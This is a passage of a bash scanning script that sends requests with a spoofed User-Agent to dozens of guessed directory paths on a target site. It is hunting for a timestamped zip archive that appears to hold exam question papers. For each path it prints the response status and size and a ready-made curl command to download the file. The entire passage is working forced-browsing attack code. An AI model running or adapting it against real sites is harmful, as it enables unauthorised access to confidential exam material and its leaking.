${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPFile_Workflow/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPFile_Workflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPFile_Workflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPB_System/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPB_System/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPB_System/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPB-Processing/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPB-Processing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPB-Processing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [FileUploadQPMaster/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}FileUploadQPMaster/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}FileUploadQPMaster/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QsnPaper_FileUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QsnPaper_FileUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QsnPaper_FileUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [TestPaper_Module/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}TestPaper_Module/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}TestPaper_Module/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Portal-QPService/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Portal-QPService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Portal-QPService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [PlatformExamPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}PlatformExamPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}PlatformExamPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Processing-QPManager/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Processing-QPManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Processing-QPManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [HandlingModule-TestPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}HandlingModule-TestPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}HandlingModule-TestPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [FileUpload_QPBulk/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}FileUpload_QPBulk/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}FileUpload_QPBulk/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [BatchProcessor_QPB/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}BatchProcessor_QPB/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}BatchProcessor_QPB/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBatchTransfer/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBatchTransfer/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBatchTransfer/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPService-DataProcessing/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPService-DataProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPService-DataProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Transfer-ExamPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Transfer-ExamPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Transfer-ExamPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBData-BulkUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBData-BulkUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBData-BulkUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMaster-DatabaseManager/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMaster-DatabaseManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMaster-DatabaseManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataProcessingQPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataProcessingQPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataProcessingQPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataPipeline_QPFile/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataPipeline_QPFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataPipeline_QPFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ModuleQ_P/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ModuleQ_P/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ModuleQ_P/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBFile_CloudSync/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBFile_CloudSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBFile_CloudSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ProcessingSuite-QuestionPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ProcessingSuite-QuestionPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ProcessingSuite-QuestionPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPSystem_ProcessingSuite/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPSystem_ProcessingSuite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPSystem_ProcessingSuite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataPipeline-QPAdmin/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataPipeline-QPAdmin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataPipeline-QPAdmin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPFile-Workflow/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPFile-Workflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPFile-Workflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPUploader_Platform/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPUploader_Platform/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPUploader_Platform/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataPipelineQPBFile/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataPipelineQPBFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataPipelineQPBFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaperDoc_Automation/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaperDoc_Automation/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaperDoc_Automation/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBFileUploader/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBFileUploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBFileUploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [FileProcessor_QPMaster/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}FileProcessor_QPMaster/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}FileProcessor_QPMaster/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ToolQ_P/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ToolQ_P/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ToolQ_P/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPCloud_Tool/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPCloud_Tool/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPCloud_Tool/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QuestionPaperFileUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QuestionPaperFileUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QuestionPaperFileUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBulk_Service/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBulk_Service/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBulk_Service/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataProcessingQPMaster/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataProcessingQPMaster/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataProcessingQPMaster/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [SuiteQPBFile/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}SuiteQPBFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}SuiteQPBFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Ops-QPBulk/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Ops-QPBulk/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Ops-QPBulk/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaper_UploadService/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaper_UploadService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaper_UploadService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMonitor-Portal/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMonitor-Portal/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
